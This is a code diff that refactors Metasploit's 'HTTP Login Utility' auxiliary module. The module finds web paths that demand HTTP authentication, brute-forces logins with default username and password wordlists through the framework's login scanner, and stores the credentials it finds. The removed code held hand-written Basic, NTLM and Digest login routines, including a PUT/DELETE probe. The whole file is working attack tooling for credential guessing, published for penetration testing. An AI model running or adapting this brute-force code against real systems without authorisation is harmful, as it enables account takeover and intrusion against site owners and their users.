@@ -1,330 +1,207 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 
 require 'msf/core'
 require 'rex/proto/ntlm/message'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/http'
 
 
 class Metasploit3 < Msf::Auxiliary
 
-	include Msf::Exploit::Remote::HttpClient
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::AuthBrute
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
 
-	include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Scanner
 
-	def initialize
-		super(
-			'Name'           => 'HTTP Login Utility',
-			'Description'    => 'This module attempts to authenticate to an HTTP service.',
-			'References'  =>
-				[
+  def initialize
+    super(
+      'Name'           => 'HTTP Login Utility',
+      'Description'    => 'This module attempts to authenticate to an HTTP service.',
+      'References'  =>
+        [
 
-				],
-			'Author'         => [ 'hdm' ],
-			'References'     =>
-				[
-					[ 'CVE', '1999-0502'] # Weak password
-				],
-			'License'        => MSF_LICENSE
-		)
+        ],
+      'Author'         => [ 'hdm' ],
+      'References'     =>
+        [
+          [ 'CVE', '1999-0502'] # Weak password
+        ],
+      'License'        => MSF_LICENSE,
+      # See https://github.com/rapid7/metasploit-framework/issues/3811
+      #'DefaultOptions' => {
+      #  'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
+      #  'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt"),
+      #  'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt"),
+      #}
+    )
 
-		register_options(
-			[
-				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
-				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
-				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
-				OptString.new('AUTH_URI', [ false, "The URI to authenticate against (default:auto)" ]),
-				OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "GET" ])
-			], self.class)
-		register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
-	end
+    register_options(
+      [
+        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
+        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
+        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
+          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
+        OptString.new('AUTH_URI', [ false, "The URI to authenticate against (default:auto)" ]),
+        OptString.new('REQUESTTYPE', [ false, "Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)", "GET" ])
+      ], self.class)
+    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
+  end
 
-	def find_auth_uri_and_scheme
+  def to_uri(uri)
+    begin
+      # In case TARGETURI is empty, at least we default to '/'
+      uri = "/" if uri.blank?
+      URI(uri)
+    rescue ::URI::InvalidURIError
+      raise RuntimeError, "Invalid URI: #{uri}"
+    end
+  end
 
-		path_and_scheme = []
-		if datastore['AUTH_URI'] and datastore['AUTH_URI'].length > 0
-			paths = [datastore['AUTH_URI']]
-		else
-			paths = %W{
-				/
-				/admin/
-				/auth/
-				/manager/
-				/Management.asp
-			}
-		end
+  def find_auth_uri
+    if datastore['AUTH_URI'].present?
+      paths = [datastore['AUTH_URI']]
+    else
+      paths = %W{
+        /
+        /admin/
+        /auth/
+        /manager/
+        /Management.asp
+      }
+    end
 
-		paths.each do |path|
-			res = send_request_cgi({
-				'uri'     => path,
-				'method'  => datastore['REQUESTTYPE'],
-			}, 10)
+    paths.each do |path|
+      uri = ''
 
-			next if not res
-			if res.code == 301 or res.code == 302 and res.headers['Location'] and res.headers['Location'] !~ /^http/
-				path = res.headers['Location']
-				vprint_status("Following redirect: #{path}")
-				res = send_request_cgi({
-					'uri'     => path,
-					'method'  => datastore['REQUESTTYPE'],
-				}, 10)
-				next if not res
-			end
+      begin
+        uri = to_uri(path)
+      rescue RuntimeError => e
+        # Bad URI so we will not try to request it
+        print_error(e.message)
+        next
+      end
 
-			next if not res.code == 401
-			next if not res.headers['WWW-Authenticate']
-			path_and_scheme << path
-			case res.headers['WWW-Authenticate']
-			when /Basic/i
-				path_and_scheme << "Basic"
-			when /NTLM/i
-				path_and_scheme << "NTLM"
-			when /Digest/i
-				path_and_scheme << "Digest"
-			end
-			return path_and_scheme
-		end
+      uri = normalize_uri(uri.path)
 
-		return path_and_scheme
-	end
+      res = send_request_cgi({
+        'uri'     => uri,
+        'method'  => datastore['REQUESTTYPE'],
+        'username' => '',
+        'password' => ''
+      }, 10)
 
-	def target_url
-		proto = "http"
-		if rport == 443 or ssl
-			proto = "https"
-		end
-		"#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
-	end
+      next unless res
+      if res.redirect? && res.headers['Location'] && res.headers['Location'] !~ /^http/
+        path = res.headers['Location']
+        vprint_status("Following redirect: #{path}")
+        res = send_request_cgi({
+          'uri'     => path,
+          'method'  => datastore['REQUESTTYPE'],
+          'username' => '',
+          'password' => ''
+        }, 10)
+        next if not res
+      end
+      next unless res.code == 401
 
-	def run_host(ip)
+      return path
+    end
 
-		if ( datastore['REQUESTTYPE'] == "PUT" ) and (datastore['AUTH_URI'] == "")
-			print_error("You need need to set AUTH_URI when using PUT Method !")
-			return
-		end
-		@uri, @scheme = find_auth_uri_and_scheme()
-		if ! @uri
-			print_error("#{target_url} No URI found that asks for HTTP authentication")
-			return
-		end
+    return nil
+  end
 
-		@uri = "/#{@uri}" if @uri[0,1] != "/"
+  def target_url
+    proto = "http"
+    if rport == 443 or ssl
+      proto = "https"
+    end
+    "#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
+  end
 
-		if ! @scheme
-			print_error("#{target_url} Incompatible authentication scheme")
-			return
-		end
+  def run_host(ip)
+    if (datastore['REQUESTTYPE'] == "PUT") && (datastore['AUTH_URI'].blank?)
+      print_error("You need need to set AUTH_URI when using PUT Method !")
+      return
+    end
+    @uri = find_auth_uri
+    if ! @uri
+      print_error("#{target_url} No URI found that asks for HTTP authentication")
+      return
+    end
 
-		print_status("Attempting to login to #{target_url} with #{@scheme} authentication")
+    @uri = "/#{@uri}" if @uri[0,1] != "/"
 
-		each_user_pass { |user, pass|
-			do_login(user, pass)
-		}
-	end
+    print_status("Attempting to login to #{target_url}")
 
-	def do_login(user='admin', pass='admin')
-		vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")
-		success = false
-		proof   = ""
+    cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS'],
+    )
 
-		ret  = do_http_login(user,pass,@scheme)
-		return :abort if ret == :abort
-		if ret == :success
-			proof   = @proof.dup
-			success = true
-		end
+    cred_collection = prepend_db_passwords(cred_collection)
 
-		if success
-			print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")
+    scanner = Metasploit::Framework::LoginScanner::HTTP.new(
+      host: ip,
+      port: rport,
+      uri: @uri,
+      method: datastore['REQUESTTYPE'],
+      proxies: datastore["PROXIES"],
+      cred_details: cred_collection,
+      stop_on_success: datastore['STOP_ON_SUCCESS'],
+      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+      connection_timeout: 5,
+      user_agent: datastore['UserAgent'],
+      vhost: datastore['VHOST'],
+      framework: framework,
+      framework_module: self,
+    )
 
-			any_user = false
-			any_pass = false
+    msg = scanner.check_setup
+    if msg
+      print_brute :level => :error, :ip => ip, :msg => "Verification failed: #{msg}"
+      return
+    end
 
-			vprint_status("#{target_url} - Trying random username with password:'#{pass}'")
-			any_user  = do_http_login(Rex::Text.rand_text_alpha(8), pass, @scheme)
+    scanner.scan! do |result|
+      credential_data = result.to_h
+      credential_data.merge!(
+          module_fullname: self.fullname,
+          workspace_id: myworkspace_id
+      )
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+        credential_core = create_credential(credential_data)
+        credential_data[:core] = credential_core
+        create_credential_login(credential_data)
+        :next_user
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        end
+        invalidate_login(credential_data)
+        :abort
+      when Metasploit::Model::Login::Status::INCORRECT
+        if datastore['VERBOSE']
+          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        end
+        invalidate_login(credential_data)
+      end
+    end
 
-			vprint_status("#{target_url} - Trying username:'#{user}' with random password")
-			any_pass  = do_http_login(user, Rex::Text.rand_text_alpha(8), @scheme)
+  end
 
-			if any_user == :success
-				user = "anyuser"
-				print_status("#{target_url} - Any username with password '#{pass}' is allowed")
-			else
-				print_status("#{target_url} - Random usernames are not allowed.")
-			end
-
-			if any_pass == :success
-				pass = "anypass"
-				print_status("#{target_url} - Any password with username '#{user}' is allowed")
-			else
-				print_status("#{target_url} - Random passwords are not allowed.")
-			end
-
-			report_auth_info(
-				:host   => rhost,
-				:port   => rport,
-				:sname => (ssl ? 'https' : 'http'),
-				:user   => user,
-				:pass   => pass,
-				:proof  => "WEBAPP=\"Generic\", PROOF=#{proof}",
-				:source_type => "user_supplied",
-				:active => true
-			)
-
-			return :abort if ([any_user,any_pass].include? :success)
-			return :next_user
-		else
-			vprint_error("#{target_url} - Failed to login as '#{user}'")
-			return
-		end
-	end
-
-	def do_http_login(user,pass,scheme)
-		case scheme
-		when /NTLM/i
-			do_http_auth_ntlm(user,pass)
-		when /Digest/i
-			do_http_auth_digest(user,pass,datastore['REQUESTTYPE'])
-		when /Basic/i
-			do_http_auth_basic(user,pass)
-		else
-			vprint_error("#{target_url}: Unknown authentication scheme")
-			return :abort
-		end
-	end
-
-	def do_http_auth_ntlm(user,pass)
-		begin
-			resp,c = send_http_auth_ntlm(
-				'uri' => @uri,
-				'username' => user,
-				'password' => pass
-			)
-			c.close
-			return :abort if (resp.code == 404)
-
-			if [200, 301, 302].include?(resp.code)
-				@proof   = resp
-				return :success
-			end
-
-		rescue ::Rex::ConnectionError
-			vprint_error("#{target_url} - Failed to connect to the web server")
-			return :abort
-		end
-
-		return :fail
-	end
-
-	def do_http_auth_basic(user,pass)
-		user_pass = Rex::Text.encode_base64(user + ":" + pass)
-
-		begin
-			res = send_request_cgi({
-				'uri'     => @uri,
-				'method'  => 'GET',
-				'headers' =>
-					{
-						'Authorization' => "Basic #{user_pass}",
-					}
-				}, 25)
-
-			unless (res.kind_of? Rex::Proto::Http::Response)
-				vprint_error("#{target_url} not responding")
-				return :abort
-			end
-
-			return :abort if (res.code == 404)
-
-			if [200, 301, 302].include?(res.code)
-				@proof   = res
-				return :success
-			end
-
-		rescue ::Rex::ConnectionError
-			vprint_error("#{target_url} - Failed to connect to the web server")
-			return :abort
-		end
-
-		return :fail
-	end
-
-	def do_http_auth_digest(user,pass,requesttype)
-		path = datastore['AUTH_URI'] || "/"
-		begin
-			if requesttype == "PUT"
-				res,c = send_digest_request_cgi({
-					'uri'     => path,
-					'method'  => requesttype,
-					'data'	=> 'Test123\r\n',
-					#'DigestAuthIIS' => false,
-					'DigestAuthUser' => user,
-					'DigestAuthPassword' => pass
-				}, 25)
-			elsif requesttype == "PROPFIND"
-				res,c = send_digest_request_cgi({
-					'uri'     => path,
-					'method'  => requesttype,
-					'data'	=> '<?xml version="1.0" encoding="utf-8"?><D:propfind xmlns:D="DAV:"><D:allprop/></D:propfind>',
-					#'DigestAuthIIS' => false,
-					'DigestAuthUser' => user,
-					'DigestAuthPassword' => pass,
-					'headers' => { 'Depth' => '0'}
-				}, 25)
-			else
-				res,c = send_digest_request_cgi({
-					'uri'     => path,
-					'method'  => requesttype,
-					#'DigestAuthIIS' => false,
-					'DigestAuthUser' => user,
-					'DigestAuthPassword' => pass
-				}, 25)
-			end
-
-			unless (res.kind_of? Rex::Proto::Http::Response)
-				vprint_error("#{target_url} not responding")
-				return :abort
-			end
-
-			return :abort if (res.code == 404)
-
-			if ( [200, 301, 302].include?(res.code) ) or (res.code == 201)
-				if ((res.code == 201) and (requesttype == "PUT"))
-					print_good("Trying to delete #{path}")
-					del_res,c = send_digest_request_cgi({
-						'uri' => path,
-						'method' => 'DELETE',
-						'DigestAuthUser' => user,
-						'DigestAuthPassword' => pass
-						}, 25)
-					if not (del_res.code == 204)
-						print_error("#{path} could be created, but not deleted again. This may have been noisy ...")
-					end
-				end
-				@proof   = res
-				return :success
-			end
-
-			if (res.code == 207) and (requesttype == "PROPFIND")
-				@proof   = res
-				return :success
-			end
-
-		rescue ::Rex::ConnectionError
-			vprint_error("#{target_url} - Failed to connect to the web server")
-			return :abort
-		end
-
-		return :fail
-	end
 
 end
